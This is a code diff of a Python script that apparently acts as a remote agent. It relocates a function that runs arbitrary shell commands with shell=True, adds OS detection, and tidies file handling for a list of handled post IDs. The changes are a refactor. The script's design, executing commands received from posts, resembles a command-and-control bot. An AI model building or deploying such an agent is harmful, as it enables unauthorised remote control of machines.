@@ -15,40 +15,46 @@ from subprocess import PIPE as pipe
 
 global queue,agent_name,pause,api
 
+def run_cmd(cmd):
+        if ' ' in cmd:
+                if cmd.split(" ")[0].lower() == "cd":
+                        newdir = cmd.split(" ")[1]
+                        try:
+                                os.chdir(newdir)
+                                return newdir
+                        except FileNotFoundError:
+                                return "[Error]: FileNotFoundError"
+        result = (popen(cmd,stdout=pipe,shell=True).communicate())[0].decode()
+        if result == '':
+                return "[blank/error]"
+        else:
+                return result
+
 mac_addr = ':'.join(("%012X" % get_mac())[i:i + 2] for i in range(0, 12, 2))
 path = os.path.dirname(os.path.abspath(__file__))
 
+testwin = run_cmd("ver")
+if not testwin == "[blank/error]":
+        slash = "\\"
+else:
+        slash = "/"
+
 # Lists and stuff
 queue = [] # ids of posts to handle
-try:
-        open(path+"\\ignore.txt","a").close()
-except: open(path+"/ignore.txt","a").close()
+
+open(path+slash+"ignore.txt","a").close()
 def ignore():
-        try:
-                with open(path+"\\ignore.txt","r") as idfile:
-                        ids = idfile.read().split("\n")
-                        idlist = []
-                        for ID in ids:
-                                if not ID == '':
-                                        idlist.append(int(ID))
-                        return idlist
-        except:
-                with open(path+"/ignore.txt","r") as idfile:
-                        ids = idfile.read().split("\n")
-                        idlist = []
-                        for ID in ids:
-                                if not ID == '':
-                                        idlist.append(int(ID))
-                        return idlist
+        with open(path+slash+"ignore.txt","r") as idfile:
+                ids = idfile.read().split("\n")
+                idlist = []
+                for ID in ids:
+                        if not ID == '':
+                                idlist.append(int(ID))
+                return idlist
 def add_ignore(ID):
-        try:
-                if not ID in ignore():
-                        with open(path+"\\ignore.txt","a") as idfile:
-                                idfile.write(str(ID)+"\n")
-        except:
-                if not ID in ignore():
-                        with open(path+"/ignore.txt","a") as idfile:
-                                idfile.write(str(ID)+"\n")
+        if not ID in ignore():
+                with open(path+slash+"ignore.txt","a") as idfile:
+                        idfile.write(str(ID)+"\n")
 pause = 2
 
 
@@ -113,20 +119,9 @@ def send_msg(msg):
 
 
 # Commands and stuff
-def run_cmd(cmd):
-        if ' ' in cmd:
-                if cmd.split(" ")[0].lower() == "cd":
-                        newdir = cmd.split(" ")[1]
-                        try:
-                                os.chdir(newdir)
-                                return newdir
-                        except FileNotFoundError:
-                                return "[Error]: FileNotFoundError"
-        result = (popen(cmd,stdout=pipe,shell=True).communicate())[0].decode()
-        if result == '':
-                return "[blank/error]"
-        else:
-                return result
+
+#run_cmd localted at top for compatability
+
 def run_bg(cmd):
         return subprocess.call(cmd,shell=True)
 def run_py(code):
